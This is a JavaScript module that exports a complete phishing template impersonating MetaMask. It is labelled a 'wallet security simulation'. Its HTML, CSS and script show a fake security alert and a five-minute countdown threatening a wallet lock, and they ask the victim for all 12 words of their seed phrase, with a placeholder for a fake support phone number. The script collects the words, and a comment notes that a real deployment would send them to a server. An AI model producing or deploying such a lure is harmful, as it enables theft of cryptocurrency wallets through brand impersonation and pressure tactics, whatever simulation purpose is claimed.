const metamaskClone = {
  name: "MetaMask Security Update",
  platform: "metamask",
  template: "metamask-clone",
  description: "Realistic MetaMask clone for wallet security simulation",
  htmlTemplate: `
    <div class="metamask-container">
      <div class="metamask-header">
        <div class="logo">
          <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIxLjQ5IDQuMjJMMTMuNSAxMi4yMUwyMS40OSAyMC4yQzIyLjI1IDE5LjQ0IDIyLjI1IDE4LjE3IDIyLjI1IDE2Ljg5VjcuMTFDMjIuMjUgNS44MyAyMi4yNSA0LjU2IDIxLjQ5IDQuMjJaIiBmaWxsPSIjRkY5ODAwIi8+CjxwYXRoIGQ9Ik0yLjUxIDQuMjJMMTAuNSAxMi4yMUwyLjUxIDIwLjJDMi4yNSAxOS40NCAyLjI1IDE4LjE3IDIuMjUgMTYuODlWNy4xMUMyLjI1IDUuODMgMi4yNSA0LjU2IDIuNTEgNC4yMloiIGZpbGw9IiNGRjk4MDAiLz4KPHBhdGggZD0iTTEyIDI0QzE4LjYyNzQgMjQgMjQgMTguNjI3NCAyNCAxMkMyNCA1LjM3MjU4IDE4LjYyNzQgMCAxMiAwQzUuMzcyNTggMCAwIDUuMzcyNTggMCAxMkMwIDE4LjYyNzQgNS4zNzI1OCAyNCAxMiAyNFoiIGZpbGw9IiNGRjk4MDAiLz4KPC9zdmc+" alt="MetaMask" />
          <span>MetaMask</span>
        </div>
        <div class="security-badge">
          <span class="security-icon">🔒</span>
          <span>Secure</span>
        </div>
      </div>
      
      <div class="main-content">
        <div class="security-alert">
          <div class="alert-icon">⚠️</div>
          <h2>Security Update Required</h2>
          <p class="alert-message">
            We detected suspicious activity on your wallet. To protect your assets, 
            please verify your seed phrase immediately.
          </p>
          <div class="urgency-timer">
            <span>Time remaining: <span id="timer">05:00</span></span>
          </div>
        </div>
        
        <div class="verification-form">
          <h3>Wallet Verification</h3>
          <p>Please enter your 12-word seed phrase to verify your wallet ownership:</p>
          
          <form id="seedPhraseForm">
            <div class="seed-phrase-inputs">
              {{FORM_FIELDS}}
            </div>
            
            <div class="form-actions">
              <button type="submit" class="verify-btn">
                <span class="btn-icon">🔐</span>
                Verify Wallet
              </button>
              <button type="button" class="cancel-btn" onclick="window.close()">
                Cancel
              </button>
            </div>
          </form>
        </div>
        
        <div class="security-notice">
          <p><strong>Important:</strong> This verification is required to prevent unauthorized access to your wallet.</p>
          <p>If you don't complete this verification within the time limit, your wallet may be temporarily locked for security.</p>
        </div>
      </div>
      
      <div class="footer">
        <p>MetaMask Security Team</p>
        <p>Need help? Call: {{phoneNumber}}</p>
      </div>
    </div>
  `,
  cssTemplate: `
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    
    .metamask-container {
      background: white;
      border-radius: 12px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
      max-width: 500px;
      width: 100%;
      overflow: hidden;
    }
    
    .metamask-header {
      background: #f8f9fa;
      padding: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #e9ecef;
    }
    
    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 600;
      font-size: 18px;
      color: #333;
    }
    
    .logo img {
      width: 32px;
      height: 32px;
    }
    
    .security-badge {
      display: flex;
      align-items: center;
      gap: 5px;
      background: #d4edda;
      color: #155724;
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 500;
    }
    
    .main-content {
      padding: 30px;
    }
    
    .security-alert {
      background: #fff3cd;
      border: 1px solid #ffeaa7;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 30px;
      text-align: center;
    }
    
    .alert-icon {
      font-size: 48px;
      margin-bottom: 15px;
    }
    
    .security-alert h2 {
      color: #856404;
      margin-bottom: 10px;
      font-size: 24px;
    }
    
    .alert-message {
      color: #856404;
      line-height: 1.6;
      margin-bottom: 15px;
    }
    
    .urgency-timer {
      background: #dc3545;
      color: white;
      padding: 10px 20px;
      border-radius: 6px;
      font-weight: 600;
      font-size: 16px;
    }
    
    .verification-form {
      margin-bottom: 30px;
    }
    
    .verification-form h3 {
      color: #333;
      margin-bottom: 10px;
      font-size: 20px;
    }
    
    .verification-form p {
      color: #666;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    
    .seed-phrase-inputs {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-bottom: 25px;
    }
    
    .form-group {
      display: flex;
      flex-direction: column;
    }
    
    .form-group label {
      font-size: 12px;
      color: #666;
      margin-bottom: 5px;
      font-weight: 500;
    }
    
    .form-control {
      padding: 10px 12px;
      border: 2px solid #e9ecef;
      border-radius: 6px;
      font-size: 14px;
      transition: border-color 0.2s;
    }
    
    .form-control:focus {
      outline: none;
      border-color: #667eea;
    }
    
    .form-actions {
      display: flex;
      gap: 15px;
    }
    
    .verify-btn {
      flex: 1;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 15px 20px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: transform 0.2s;
    }
    
    .verify-btn:hover {
      transform: translateY(-2px);
    }
    
    .cancel-btn {
      background: #6c757d;
      color: white;
      border: none;
      padding: 15px 20px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    
    .cancel-btn:hover {
      background: #5a6268;
    }
    
    .security-notice {
      background: #f8f9fa;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 20px;
    }
    
    .security-notice p {
      color: #495057;
      margin-bottom: 10px;
      font-size: 14px;
      line-height: 1.5;
    }
    
    .security-notice p:last-child {
      margin-bottom: 0;
    }
    
    .footer {
      background: #f8f9fa;
      padding: 20px;
      text-align: center;
      border-top: 1px solid #e9ecef;
    }
    
    .footer p {
      color: #6c757d;
      font-size: 14px;
      margin-bottom: 5px;
    }
    
    .footer p:last-child {
      margin-bottom: 0;
    }
    
    @media (max-width: 480px) {
      .metamask-container {
        margin: 10px;
        border-radius: 8px;
      }
      
      .main-content {
        padding: 20px;
      }
      
      .seed-phrase-inputs {
        grid-template-columns: repeat(2, 1fr);
      }
      
      .form-actions {
        flex-direction: column;
      }
    }
  `,
  jsTemplate: `
    // Countdown timer
    let timeLeft = 300; // 5 minutes in seconds
    
    function updateTimer() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      document.getElementById('timer').textContent = 
        \`\${minutes.toString().padStart(2, '0')}:\${seconds.toString().padStart(2, '0')}\`;
      
      if (timeLeft <= 0) {
        alert('Time expired! Your wallet has been locked for security.');
        window.close();
        return;
      }
      
      timeLeft--;
      setTimeout(updateTimer, 1000);
    }
    
    // Start timer when page loads
    document.addEventListener('DOMContentLoaded', function() {
      updateTimer();
      
      // Form submission
      document.getElementById('seedPhraseForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        const seedPhrase = [];
        
        for (let i = 1; i <= 12; i++) {
          const word = formData.get(\`word\${i}\`) || '';
          if (word.trim()) {
            seedPhrase.push(word.trim());
          }
        }
        
        if (seedPhrase.length !== 12) {
          alert('Please enter all 12 words of your seed phrase.');
          return;
        }
        
        // Show loading state
        const submitBtn = document.querySelector('.verify-btn');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = '<span class="btn-icon">⏳</span> Verifying...';
        submitBtn.disabled = true;
        
        // Simulate verification process
        setTimeout(() => {
          // Send data to server (this would be handled by the form action in real implementation)
          alert('Verification successful! Your wallet is now secure.');
          window.close();
        }, 2000);
      });
      
      // Auto-focus first input
      document.getElementById('word1').focus();
      
      // Auto-tab to next input
      for (let i = 1; i <= 12; i++) {
        const input = document.getElementById(\`word\${i}\`);
        input.addEventListener('input', function() {
          if (this.value.length >= 3 && i < 12) {
            document.getElementById(\`word\${i + 1}\`).focus();
          }
        });
      }
    });
  `,
  formFields: [
    { name: 'word1', type: 'text', placeholder: 'Word 1', required: true, order: 1 },
    { name: 'word2', type: 'text', placeholder: 'Word 2', required: true, order: 2 },
    { name: 'word3', type: 'text', placeholder: 'Word 3', required: true, order: 3 },
    { name: 'word4', type: 'text', placeholder: 'Word 4', required: true, order: 4 },
    { name: 'word5', type: 'text', placeholder: 'Word 5', required: true, order: 5 },
    { name: 'word6', type: 'text', placeholder: 'Word 6', required: true, order: 6 },
    { name: 'word7', type: 'text', placeholder: 'Word 7', required: true, order: 7 },
    { name: 'word8', type: 'text', placeholder: 'Word 8', required: true, order: 8 },
    { name: 'word9', type: 'text', placeholder: 'Word 9', required: true, order: 9 },
    { name: 'word10', type: 'text', placeholder: 'Word 10', required: true, order: 10 },
    { name: 'word11', type: 'text', placeholder: 'Word 11', required: true, order: 11 },
    { name: 'word12', type: 'text', placeholder: 'Word 12', required: true, order: 12 }
  ],
  assets: {
    logo: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIxLjQ5IDQuMjJMMTMuNSAxMi4yMUwyMS40OSAyMC4yQzIyLjI1IDE5LjQ0IDIyLjI1IDE4LjE3IDIyLjI1IDE2Ljg5VjcuMTFDMjIuMjUgNS44MyAyMi4yNSA0LjU2IDIxLjQ5IDQuMjJaIiBmaWxsPSIjRkY5ODAwIi8+CjxwYXRoIGQ9Ik0yLjUxIDQuMjJMMTAuNSAxMi4yMUwyLjUxIDIwLjJDMi4yNSAxOS40NCAyLjI1IDE4LjE3IDIuMjUgMTYuODlWNy4xMUMyLjI1IDUuODMgMi4yNSA0LjU2IDIuNTEgNC4yMloiIGZpbGw9IiNGRjk4MDAiLz4KPHBhdGggZD0iTTEyIDI0QzE4LjYyNzQgMjQgMjQgMTguNjI3NCAyNCAxMkMyNCA1LjM3MjU4IDE4LjYyNzQgMCAxMiAwQzUuMzcyNTggMCAwIDUuMzcyNTggMCAxMkMwIDE4LjYyNzQgNS4zNzI1OCAyNCAxMiAyNFoiIGZpbGw9IiNGRjk4MDAiLz4KPC9zdmc+',
    favicon: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI5LjE5IDUuNjNMMTguMDAwMSAxNi4yOEwyOS4xOSAyNi45M0MzMC4zMzMzIDI1LjkxOTkgMzAuMzMzMyAyNC4yMjY3IDMwLjMzMzMgMjIuNTE4N1Y5LjQ4MTMzQzMwLjMzMzMgNy43NzMzMyAzMC4zMzMzIDYuMDgwMTMgMjkuMTkgNS42M1oiIGZpbGw9IiNGRjk4MDAiLz4KPHBhdGggZD0iTTIuODA5OTkgNS42M0wxNC4wMDAxIDE2LjI4TDIuODA5OTkgMjYuOTNDMi4zMzMzMyAyNS45MTk5IDIuMzMzMzMgMjQuMjI2NyAyLjMzMzMzIDIyLjUxODdWOS40ODEzM0MyLjMzMzMzIDcuNzczMzMgMi4zMzMzMyA2LjA4MDEzIDIuODA5OTkgNS42M1oiIGZpbGw9IiNGRjk4MDAiLz4KPHBhdGggZD0iTTE2IDMyQzI0LjgzNjYgMzIgMzIgMjQuODM2NiAzMiAxNkMzMiA3LjE2MzQ0IDI0LjgzNjYgMCAxNiAwQzcuMTYzNDQgMCAwIDcuMTYzNDQgMCAxNkMwIDI0LjgzNjYgNy4xNjM0NCAzMiAxNiAzMloiIGZpbGw9IiNGRjk4MDAiLz4KPC9zdmc+'
  },
  branding: {
    primaryColor: '#FF9800',
    secondaryColor: '#667eea',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
    logoUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIxLjQ5IDQuMjJMMTMuNSAxMi4yMUwyMS40OSAyMC4yQzIyLjI1IDE5LjQ0IDIyLjI1IDE4LjE3IDIyLjI1IDE2Ljg5VjcuMTFDMjIuMjUgNS44MyAyMi4yNSA0LjU2IDIxLjQ5IDQuMjJaIiBmaWxsPSIjRkY5ODAwIi8+CjxwYXRoIGQ9Ik0yLjUxIDQuMjJMMTAuNSAxMi4yMUwyLjUxIDIwLjJDMi4yNSAxOS40NCAyLjI1IDE4LjE3IDIuMjUgMTYuODlWNy4xMUMyLjI1IDUuODMgMi4yNSA0LjU2IDIuNTEgNC4yMloiIGZpbGw9IiNGRjk4MDAiLz4KPHBhdGggZD0iTTEyIDI0QzE4LjYyNzQgMjQgMjQgMTguNjI3NCAyNCAxMkMyNCA1LjM3MjU4IDE4LjYyNzQgMCAxMiAwQzUuMzcyNTggMCAwIDUuMzcyNTggMCAxMkMwIDE4LjYyNzQgNS4zNzI1OCAyNCAxMiAyNFoiIGZpbGw9IiNGRjk4MDAiLz4KPC9zdmc+'
  },
  functionality: {
    hasCaptcha: false,
    hasProgressBar: false,
    hasLoadingStates: true,
    hasErrorHandling: true,
    redirectAfterSubmit: true
  },
  securityFeatures: {
    requiresHttps: true,
    hasCsrfProtection: false,
    rateLimiting: true
  },
  isActive: true,
  tags: ['metamask', 'wallet', 'crypto', 'security', 'seed-phrase']
};

module.exports = metamaskClone; 